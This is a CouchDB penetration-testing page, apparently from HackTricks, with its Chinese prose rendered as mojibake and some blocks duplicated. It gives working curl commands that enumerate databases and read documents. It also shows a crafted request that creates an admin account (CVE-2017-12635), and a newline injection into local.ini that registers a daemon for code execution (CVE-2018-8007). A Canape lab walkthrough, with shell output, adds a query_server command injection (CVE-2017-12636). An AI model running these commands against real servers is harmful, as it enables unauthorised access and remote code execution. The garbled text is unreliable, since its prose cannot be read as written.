# 5984,6984 - å¯¹CouchDBçš„æ¸—é€æµ‹è¯•

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

CouchDBæ˜¯ä¸€ä¸ªé¢å‘æ–‡æ¡£çš„æ•°æ®åº“ï¼Œåœ¨æ¯ä¸ªæ–‡æ¡£ä¸­å­—æ®µä»¥é”®å€¼æ˜ å°„çš„å½¢å¼å­˜å‚¨ã€‚å­—æ®µå¯ä»¥æ˜¯ç®€å•çš„é”®/å€¼å¯¹ã€åˆ—è¡¨æˆ–æ˜ å°„ã€‚

å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¯ä¸ªæ–‡æ¡£éƒ½è¢«èµ‹äºˆä¸€ä¸ªæ–‡æ¡£çº§åˆ«çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆ`_id`ï¼‰ä»¥åŠæ¯æ¬¡æ›´æ”¹å¹¶ä¿å­˜åˆ°æ•°æ®åº“çš„ä¿®è®¢å·ï¼ˆ`_rev`ï¼‰ã€‚

**é»˜è®¤ç«¯å£ï¼š** 5984(http), 6984(https)
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **è‡ªåŠ¨æšä¸¾**
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
## æ‰‹åŠ¨æšä¸¾

### æ¨ªå¹…
```
curl http://IP:5984/
```
æ­¤æ“ä½œå‘å·²å®‰è£…çš„CouchDBå®ä¾‹å‘å‡ºGETè¯·æ±‚ã€‚å›å¤åº”ç±»ä¼¼äºä»¥ä¸‹ä¹‹ä¸€ï¼š
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœè®¿é—® couchdb çš„æ ¹ç›®å½•æ—¶æ”¶åˆ° `401 Unauthorized`ï¼Œå¹¶å‡ºç°å¦‚ä¸‹ä¿¡æ¯ï¼š`{"error":"unauthorized","reason":"Authentication required."}`ï¼Œ**æ‚¨å°†æ— æ³•è®¿é—®**æ¨ªå¹…æˆ–ä»»ä½•å…¶ä»–ç«¯ç‚¹ã€‚
{% endhint %}

### ä¿¡æ¯æšä¸¾

ä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥é€šè¿‡ **GET** è¯·æ±‚è®¿é—®å¹¶æå–ä¸€äº›æœ‰è¶£ä¿¡æ¯çš„ç«¯ç‚¹ã€‚æ‚¨å¯ä»¥åœ¨ [**couchdb æ–‡æ¡£ä¸­æ‰¾åˆ°æ›´å¤šç«¯ç‚¹å’Œæ›´è¯¦ç»†çš„æè¿°**](https://docs.couchdb.org/en/latest/api/index.html)ã€‚

* **`/_active_tasks`** æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡åˆ—è¡¨ï¼ŒåŒ…æ‹¬ä»»åŠ¡ç±»å‹ã€åç§°ã€çŠ¶æ€å’Œè¿›ç¨‹ IDã€‚
* **`/_all_dbs`** è¿”å› CouchDB å®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„åˆ—è¡¨ã€‚
* **`/_cluster_setup`** æ ¹æ®é›†ç¾¤è®¾ç½®å‘å¯¼è¿”å›èŠ‚ç‚¹æˆ–é›†ç¾¤çš„çŠ¶æ€ã€‚
* **`/_db_updates`** è¿”å› CouchDB å®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“äº‹ä»¶çš„åˆ—è¡¨ã€‚ä½¿ç”¨æ­¤ç«¯ç‚¹éœ€è¦ `_global_changes` æ•°æ®åº“çš„å­˜åœ¨ã€‚
* **`/_membership`** æ˜¾ç¤ºä½œä¸º `cluster_nodes` çš„é›†ç¾¤éƒ¨åˆ†çš„èŠ‚ç‚¹ã€‚å­—æ®µ `all_nodes` æ˜¾ç¤ºæ­¤èŠ‚ç‚¹æ‰€çŸ¥çš„æ‰€æœ‰èŠ‚ç‚¹ï¼ŒåŒ…æ‹¬é›†ç¾¤çš„ä¸€éƒ¨åˆ†ã€‚
* **`/_scheduler/jobs`** å¤åˆ¶ä½œä¸šåˆ—è¡¨ã€‚æ¯ä¸ªä½œä¸šæè¿°å°†åŒ…æ‹¬æºå’Œç›®æ ‡ä¿¡æ¯ã€å¤åˆ¶ idã€æœ€è¿‘äº‹ä»¶çš„å†å²è®°å½•ç­‰ã€‚
* **`/_scheduler/docs`** å¤åˆ¶æ–‡æ¡£çŠ¶æ€åˆ—è¡¨ã€‚åŒ…æ‹¬æ‰€æœ‰æ–‡æ¡£çš„ä¿¡æ¯ï¼Œå³ä½¿æ˜¯ `completed` å’Œ `failed` çŠ¶æ€çš„æ–‡æ¡£ã€‚å¯¹äºæ¯ä¸ªæ–‡æ¡£ï¼Œå®ƒè¿”å›æ–‡æ¡£ IDã€æ•°æ®åº“ã€å¤åˆ¶ IDã€æºå’Œç›®æ ‡ç­‰ä¿¡æ¯ã€‚
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** `/_node/{node-name}` ç«¯ç‚¹å¯ç”¨äºç¡®è®¤å¤„ç†è¯·æ±‚çš„æœåŠ¡å™¨çš„ Erlang èŠ‚ç‚¹åç§°ã€‚å½“è®¿é—® `/_node/_local` ä»¥æ£€ç´¢æ­¤ä¿¡æ¯æ—¶ï¼Œè¿™æœ€æœ‰ç”¨ã€‚
* **`/_node/{node-name}/_stats`** `_stats` èµ„æºè¿”å›åŒ…å«è¿è¡ŒæœåŠ¡å™¨ç»Ÿè®¡ä¿¡æ¯çš„ JSON å¯¹è±¡ã€‚å­—é¢å­—ç¬¦ä¸² `_local` ä½œä¸ºæœ¬åœ°èŠ‚ç‚¹åç§°çš„åˆ«åï¼Œå› æ­¤å¯¹äºæ‰€æœ‰ç»Ÿè®¡ URLï¼Œ`{node-name}` å¯ä»¥æ›¿æ¢ä¸º `_local`ï¼Œä»¥ä¸æœ¬åœ°èŠ‚ç‚¹çš„ç»Ÿè®¡ä¿¡æ¯è¿›è¡Œäº¤äº’ã€‚
* **`/_node/{node-name}/_system`** \_system èµ„æºè¿”å›åŒ…å«è¿è¡ŒæœåŠ¡å™¨çš„å„ç§ç³»ç»Ÿçº§ç»Ÿè®¡ä¿¡æ¯çš„ JSON å¯¹è±¡\_ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ \_\_`_local` ä½œä¸º {node-name} æ¥è·å–å½“å‰èŠ‚ç‚¹ä¿¡æ¯ã€‚
* **`/_node/{node-name}/_restart`**
* **`/_up`** ç¡®è®¤æœåŠ¡å™¨æ­£åœ¨è¿è¡Œï¼Œå¹¶å‡†å¤‡å“åº”è¯·æ±‚ã€‚å¦‚æœ [`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode) ä¸º `true` æˆ– `nolb`ï¼Œç«¯ç‚¹å°†è¿”å› 404 å“åº”ã€‚
* **`/_uuids`** ä» CouchDB å®ä¾‹è¯·æ±‚ä¸€ä¸ªæˆ–å¤šä¸ªé€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆUUIDï¼‰ã€‚
* **`/_reshard`** è¿”å›å·²å®Œæˆã€å¤±è´¥ã€è¿è¡Œã€åœæ­¢å’Œæ€»ä½œä¸šçš„è®¡æ•°ï¼Œä»¥åŠé›†ç¾¤ä¸Šé‡åˆ†ç‰‡çš„çŠ¶æ€ã€‚

å¯ä»¥å¦‚æ­¤å¤„æ‰€è§£é‡Šçš„é‚£æ ·æå–æ›´å¤šæœ‰è¶£çš„ä¿¡æ¯ï¼š[https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **æ•°æ®åº“åˆ—è¡¨**
```
curl -X GET http://IP:5984/_all_dbs
```
å¦‚æœè¯¥è¯·æ±‚**å“åº”401æœªæˆæƒ**ï¼Œåˆ™æ‚¨éœ€è¦ä¸€äº›**æœ‰æ•ˆçš„å‡­æ®**æ¥è®¿é—®æ•°æ®åº“ï¼š
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
ä¸ºäº†æ‰¾åˆ°æœ‰æ•ˆçš„å‡­è¯ï¼Œä½ å¯ä»¥**å°è¯•**[**æš´åŠ›ç ´è§£æœåŠ¡**](../generic-methodologies-and-resources/brute-force.md#couchdb)ã€‚

ä»¥ä¸‹æ˜¯å½“ä½ æ‹¥æœ‰è¶³å¤Ÿæƒé™åˆ—å‡ºæ•°æ®åº“æ—¶ï¼Œcouchdbçš„**å“åº”**ç¤ºä¾‹ï¼ˆè¿™åªæ˜¯æ•°æ®åº“åˆ—è¡¨ï¼‰ï¼š
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### æ•°æ®åº“ä¿¡æ¯

æ‚¨å¯ä»¥é€šè¿‡è®¿é—®æ•°æ®åº“åç§°æ¥è·å–ä¸€äº›æ•°æ®åº“ä¿¡æ¯ï¼ˆå¦‚æ–‡ä»¶æ•°é‡å’Œå¤§å°ï¼‰ï¼š
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **æ–‡æ¡£åˆ—è¡¨**

åˆ—å‡ºæ•°æ®åº“å†…çš„æ¯ä¸ªæ¡ç›®
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **è¯»å–æ–‡æ¡£**

è¯»å–æ•°æ®åº“å†…éƒ¨æ–‡æ¡£çš„å†…å®¹ï¼š
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDB æƒé™æå‡ [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

ç”±äº Erlang å’Œ JavaScript JSON è§£æå™¨ä¹‹é—´çš„å·®å¼‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯·æ±‚**åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·**ï¼Œå‡­æ®ä¸º `hacktricks:hacktricks`ï¼š
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**å…³äºæ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDB RCE

### Erlang Cookie

åœ¨CouchDBæ–‡æ¡£çš„[é›†ç¾¤è®¾ç½®éƒ¨åˆ†](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)ï¼Œè®¨è®ºäº†CouchDBä½¿ç”¨çš„ä¸åŒç«¯å£ï¼š

> CouchDBåœ¨é›†ç¾¤æ¨¡å¼ä¸‹ä½¿ç”¨ç«¯å£`5984`ï¼Œå°±åƒç‹¬ç«‹æ¨¡å¼ä¸€æ ·ï¼Œä½†å®ƒä¹Ÿä½¿ç”¨`5986`ç”¨äºèŠ‚ç‚¹æœ¬åœ°APIã€‚
>
> Erlangä½¿ç”¨TCPç«¯å£`4369`ï¼ˆEPMDï¼‰æ¥æŸ¥æ‰¾å…¶ä»–èŠ‚ç‚¹ï¼Œå› æ­¤æ‰€æœ‰æœåŠ¡å™¨å¿…é¡»èƒ½å¤Ÿåœ¨æ­¤ç«¯å£ä¸Šç›¸äº’é€šä¿¡ã€‚åœ¨Erlangé›†ç¾¤ä¸­ï¼Œæ‰€æœ‰èŠ‚ç‚¹éƒ½è¿æ¥åˆ°æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹ã€‚ä¸€ä¸ªç½‘çŠ¶ç»“æ„ã€‚

ç„¶åæœ‰ä¸€ä¸ªæœ‰è¶£çš„è­¦å‘Šï¼š

![1536931232858](https://0xdf.gitlab.io/img/1536931232858.png)

å¦‚æœæˆ‘ä»¬æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é‚£ä¸ªcookieï¼Œâ€œmonsterâ€ï¼š
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
**æ‚¨å¯ä»¥**[**é˜…è¯»æœ¬èŠ‚äº†è§£å¦‚ä½•æ»¥ç”¨Erlangs cookiesä»¥è·å¾—RCE**](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**ã€‚**\
æ­¤å¤–ï¼Œæ‚¨å¯ä»¥é˜…è¯»ä¸€äº›**Canape HTBæœºå™¨å‰–æ**[**åƒè¿™ç¯‡**](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)æ¥çœ‹çœ‹å¹¶**å®è·µ**å¦‚ä½•**åˆ©ç”¨è¿™ä¸ªæ¼æ´**ã€‚

### **æˆåŠŸåˆ©ç”¨CVE-2018-8007å¹¶å…·æœ‰local.iniå†™æƒé™**

åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œæˆ‘å‘ç°mdsecå‘å¸ƒäº†ä¸€ä¸ªæ–°çš„CouchDB CVEï¼Œ[CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/)ã€‚å®ƒä¹Ÿéœ€è¦å¯¹`local.ini`æ–‡ä»¶çš„å†™å…¥æƒé™ï¼Œæ‰€ä»¥å®ƒå¯¹Canapeæ¥è¯´ä¸æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„é€‰é¡¹ã€‚ä½†æ—¢ç„¶æˆ‘å·²ç»å°†å…¶è®¾ç½®ä¸ºrootå¯å†™ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬æ˜¯å¦èƒ½è®©å®ƒå·¥ä½œã€‚

ä»ä¸€ä¸ªå¹²å‡€ä¸”ç°åœ¨å¯å†™çš„`local.ini`ï¼ˆå’Œä¸€ä¸ªå¤‡ä»½ï¼‰å¼€å§‹ï¼š
```
root@canape:/home/homer/etc# ls -l
total 40
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
æˆ‘ä»¬å¯ä»¥ä½¿ç”¨curlä¿®æ”¹`local.ini`æ–‡ä»¶ä¸­çš„originsã€‚è¿™é‡Œçš„æ¼æ´æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨curlæ”¾å…¥ä¸€ä¸ªæ–°çš„originç„¶åæ˜¯æ–°çš„è¡Œï¼Œæˆ‘ä»¬å¯ä»¥å†™å…¥é¢å¤–çš„å†…å®¹ï¼ŒåŒ…æ‹¬ä¸€ä¸ªæ–°çš„å¤´éƒ¨å’Œç»†èŠ‚ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨`[os_daemons]`å­—æ®µï¼Œå¹¶æ·»åŠ ä¸€ä¸ªè¿›ç¨‹è®©CouchDBå°è¯•æŒç»­è¿è¡Œï¼š
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
åœ¨æ ¹shellä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å˜åŒ–ï¼š
```
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
<
< [cors]
< origins = 0xdf
<
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
æ–‡ä»¶å´ä¸åœ¨é‚£é‡Œï¼š
```
root@canape:/home/homer/etc# ls /tmp/0xdf
ls: cannot access '/tmp/0xdf': No such file or directory
```
å¦‚æœæˆ‘ä»¬æŸ¥çœ‹å¸¦æœ‰â€œcouchdbâ€å‘½ä»¤è¡Œçš„æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥çœ‹åˆ°æ—©å…ˆæˆ‘ä»¬ä½¿ç”¨è¿‡çš„cookieå€¼çš„å‘½ä»¤è¡Œï¼Œè¿˜æœ‰`runsrv couchdb`ï¼š
```
root@canape:/home/homer/bin# ps aux | grep couch
root        711  0.0  0.0   4240   696 ?        Ss   14:28   0:00 runsv couchdb
root        728  0.0  0.0   4384   812 ?        S    14:28   0:00 svlogd -tt /var/log/couchdb
homer      1785  0.8  3.1 638992 31248 ?        Sl   17:55   0:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bi
n/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```
å¦‚æœæˆ‘ä»¬ç»ˆæ­¢é‚£ä¸ªè¿›ç¨‹ï¼Œå®ƒä¼šç«‹å³é‡å¯ï¼ˆæ³¨æ„æ–°çš„pidï¼‰ï¼š
```
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ps aux | grep runsrv
root       2031  0.0  0.0  14224   980 pts/2    S+   18:09   0:00 grep --color=auto runsrv
```
åœ¨é‡å¯æ—¶ï¼Œè¿è¡ŒOS\_Daemonsï¼š
```
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
### **é€šè¿‡ CVE-2017-12636 æˆåŠŸå°è¯•å¹¶å…·æœ‰ local.ini å†™æƒé™**

CVE-2017-12636 å…è®¸é€šè¿‡ couchdb è¿›ç¨‹æ‰§è¡Œä»£ç ã€‚ç„¶è€Œï¼Œåœ¨è¿™ç§é…ç½®ä¸­å®ƒä¸ä¼šèµ·ä½œç”¨ã€‚

æœ‰ä¸€äº› POC å¯ä»¥ä½œä¸ºå‚è€ƒï¼š

* [https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
* [https://www.exploit-db.com/exploits/44913/](https://www.exploit-db.com/exploits/44913/)

æˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€ä¸ªæ–°çš„ query\_serverï¼Œç„¶åè°ƒç”¨å®ƒã€‚å½“ Canape å‘å¸ƒæ—¶ï¼Œå¤§å¤šæ•° POC éƒ½æ˜¯é’ˆå¯¹ couchdb 1.x çš„ï¼Œä½†è¿™ä¸ªç›’å­è¿è¡Œçš„æ˜¯ 2ï¼Œæ‰€ä»¥å¤§å¤šæ•° POC ä¸­çš„ query\_servers è·¯å¾„ä¸å­˜åœ¨ã€‚ç°åœ¨å·²ç»æ”¹å˜äº†ï¼Œä½†æˆ‘ä»¬å°†éµå¾ªç›¸åŒçš„æ­¥éª¤ã€‚é¦–å…ˆï¼Œè·å–ç‰ˆæœ¬ï¼Œå¹¶æ˜¾ç¤º 1.X è·¯å¾„ä¸å­˜åœ¨ï¼š
```bash
www-data@canape:/var/www/git$ curl http://localhost:5984
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_config/query_servers/
{"error":"not_found","reason":"Database does not exist."}
```
æ›´æ–°ä¸º2.0çš„æ–°è·¯å¾„ï¼š
```bash
www-data@canape:/var/www/git$ curl 'http://0xdf:df@localhost:5984/_membership'
{"all_nodes":["couchdb@localhost"],"cluster_nodes":["couchdb@localhost"]}

www-data@canape:/var/www/git$ curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
{"coffeescript":"./bin/couchjs ./share/server/main-coffee.js","javascript":"./bin/couchjs ./share/server/main.js"}
```
ä»é‚£é‡Œï¼Œæˆ‘ä»¬åº”è¯¥æ·»åŠ ä¸€ä¸ª`query_server`ç„¶åè°ƒç”¨å®ƒï¼Œä½†æˆ‘ä»¬åšä¸åˆ°ã€‚
```bash
www-data@canape:/var/www/git$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
{"error":"badmatch","reason":"{badrpc,{'EXIT',{{{badmatch,{error,eacces}},\n                  [{config_writer,save_to_file,2,\n                                  [{file,\"src/config_writer.erl\"},{line,38}]},\n                   {config,handle_call,3,[{file,\"src/config.erl\"},{line,222}]},\n                   {gen_server,try_handle_call,4,\n                               [{file,\"gen_server.erl\"},{line,629}]},\n                   {gen_server,handle_msg,5,\n                               [{file,\"gen_server.erl\"},{line,661}]},\n                   {proc_lib,init_p_do_apply,3,\n                             [{file,\"proc_lib.erl\"},{line,240}]}]},\n                 {gen_server,call,\n                             [config,\n                              {set,\"query_servers\",\"cmd\",\n                                   \"/sbin/ifconfig > /tmp/df\",true,nil}]}}}}","ref":1617834159}
```
ä¸€äº›è°·æ­Œæœç´¢æ˜¾ç¤ºè¿™æ˜¯ä¸€ä¸ªæƒé™é—®é¢˜ã€‚å®é™…ä¸Šï¼Œå¦‚æœæˆ‘ä»¬ç”¨æˆ‘ä»¬çš„root shellæ£€æŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°`local.ini`æ–‡ä»¶æ˜¯ä¸å¯å†™çš„ï¼Œæ›´ä¸ç”¨è¯´www-dataäº†ï¼š
```
root@canape:/home/home/etc# ls -ls local.ini
8 -r--r--r-- 1 homer homer 4841 Sep 14 17:11 local.ini
```
å› æ­¤ï¼Œå¯¹äºCanapeæ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªæ­»èƒ¡åŒã€‚ä½†å¦‚æœæˆ‘ä»¬æƒ³å°è¯•è®©å®ƒå·¥ä½œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬çš„rootæˆ–homerè®¿é—®æƒé™ä½¿å…¶å¯è¯»ï¼Œå¹¶ç»§ç»­æ²¿ç€è¿™æ¡è·¯èµ°ä¸‹å»ã€‚æˆ‘ä»¬å°†å¤‡ä»½åŸå§‹æ–‡ä»¶ï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ‰€åšçš„æ›´æ”¹ï¼š
```
root@canape:/# cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
root@canape:/# chmod 666 /home/homer/etc/local.ini
```
ç°åœ¨ï¼Œå›åˆ°æˆ‘ä»¬çš„ www-data shellï¼š
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```

```
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig > /tmp/df"'
""
```
æˆ‘ä»¬å¾—åˆ°äº†ä¹‹å‰çš„cmdæŸ¥è¯¢æœåŠ¡å™¨çš„å€¼ï¼Œè¿™æ„å‘³ç€æˆåŠŸã€‚åœ¨æ ¹shellä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒèµ·ä½œç”¨äº†ï¼š
```
root@canape:/home/homer/etc# diff local.ini local.ini.bk
48c48
< cmd = /sbin/ifconfig > /tmp/df
---
> cmd =
```
```markdown
ç°åœ¨ï¼Œæˆ‘ä»¬åº”è¯¥èƒ½å¤Ÿåˆ›å»ºä¸€ä¸ªæ•°æ®åº“ï¼Œç„¶ååœ¨è¯¥æ•°æ®åº“ä¸­åˆ›å»ºä¸€ä¸ªæ–‡æ¡£ï¼Œå¹¶é€šè¿‡æ˜ å°„æˆ‘ä»¬çš„ query_server çš„è§†å›¾è¯·æ±‚å®ƒä»¥è·å¾—æ‰§è¡Œã€‚

åˆ›å»ºæ•°æ®åº“å’Œæ–‡æ¡£ï¼š
```
```bash
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```

```
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","god","passwords","simpsons","vultest"]
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df'
{"ok":true}
www-data@canape:/dev/shm$ curl 'http://0xdf:df@localhost:5984/_all_dbs'
["_global_changes","_metadata","_replicator","_users","df","passwords","simpsons"]

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
{"ok":true,"id":"zero","rev":"1-967a00dff5e02add41819138abb3284d"}
```
è¯·æ±‚å®ƒåœ¨ä¸€ä¸ªè§†å›¾ä¸­ï¼š
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}' -H "Content-Type: application/json"
```
#### [æ‘˜è¦](https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0) ä½¿ç”¨ä¸åŒçš„æœ‰æ•ˆè½½è·

## Shodan

